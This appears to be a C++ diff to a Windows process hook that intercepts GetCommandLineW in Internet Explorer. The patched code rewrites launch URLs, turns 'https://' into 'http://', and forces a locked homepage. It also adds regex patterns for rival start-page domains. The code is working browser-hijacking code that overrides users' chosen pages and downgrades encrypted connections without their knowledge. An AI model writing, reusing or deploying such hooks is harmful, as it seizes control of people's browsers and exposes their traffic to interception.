@@ -45,6 +45,9 @@ namespace {
 
 		_S("(?: |http[s]?://)*\\.114la\\.com/*.*$"), // www.114la.com
 
+		_S("(?: |http[s]?://).*\\.56wanyx\\.com/*.*$"), // http://index.56wanyx.com/roll?p=1f901405
+		_S("(?: |http[s]?://).*\\.56wanyx\\.win/*.*$"), // http://index.56wanyx.win/roll?p=1f901405
+
 		_S("127\.0\.0\.1:"),
 		_S("localhost:"),
 
@@ -265,22 +268,28 @@ LPWSTR WINAPI InlineGetCommandLineW(VOID)
 			HeapFree(GetProcessHeap(), 0, ustrCommandLine.Buffer);
 		}
 
-		ustrCommandLine.Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, sizeof(WCHAR) * ustrCommandLine.MaximumLength);
+		ustrCommandLine.Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, sizeof(WCHAR) * (ustrCommandLine.MaximumLength + 1));
 	}
 
 	if (NULL != ustrCommandLine.Buffer) {
 		ustrCommandLine.Length = pProcessParameters->CommandLine.Length;
+
+		ustrCommandLine.Buffer[ustrCommandLine.Length] = L'\0';
 		memcpy(ustrCommandLine.Buffer, pProcessParameters->CommandLine.Buffer, pProcessParameters->CommandLine.Length * sizeof(WCHAR));
 	}
 
 	for (LPCWSTR pcwszNextOffset = wcsistr(ustrCommandLine.Buffer, _W("https://")); pcwszNextOffset != NULL; pcwszNextOffset = wcsistr(pcwszNextOffset, _W("https://")))
 	{
-		memmove((LPWSTR)&pcwszNextOffset[4], &pcwszNextOffset[5], wcslen(pcwszNextOffset) * sizeof(WCHAR));
+		if (NULL != wcsistr(ustrCommandLine.Buffer, L"qq.com/")) {
+			break;
+		}
 
-		Global::Log.PrintW(LOGOutputs, L"Rewrite command line: %s", ustrCommandLine.Buffer);
+		memmove((LPWSTR)&pcwszNextOffset[4], &pcwszNextOffset[5], (wcslen(pcwszNextOffset) + 1) * sizeof(WCHAR));
+
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] Rewrite command line: %s", GetCurrentProcessId(), ustrCommandLine.Buffer);
 	}
 
-	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
+	LPCWSTR pcwszNewParameter = URL_HOMEADDR;
 	LPWSTR pcwszStartCommandLine = ustrCommandLine.Buffer;
 	//LPWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
 
@@ -295,7 +304,7 @@ LPWSTR WINAPI InlineGetCommandLineW(VOID)
 		pcwszStartCommandLine = ustrCommandLine.Buffer;
 		_swprintf(ustrCommandLine.Buffer, L"\"%s\" %s", pProcessParameters->ImagePathName.Buffer, pcwszNewParameter);
 
-		Global::Log.PrintW(LOGOutputs, L"New command line redirect to %s", pcwszStartCommandLine);
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] New command line redirect to %s", GetCurrentProcessId(), pcwszStartCommandLine);
 	}
 
 	return pcwszStartCommandLine;
@@ -362,7 +371,7 @@ bool Hook::StartCommandLineHook()
 	}
 
 	if (NULL != wcsistr(pcwszStartImagePathName, _W("\\iexplore.exe")) && IsRedirectCommandLine(pcwszStartCommandLine)) {
-		pcwszNewParameter = L"http://www.iehome.com/?lock";
+		pcwszNewParameter = URL_HOMEADDR;
 	}
 
 	//////////////////////////////////////////////////////////////////////////////////////////////
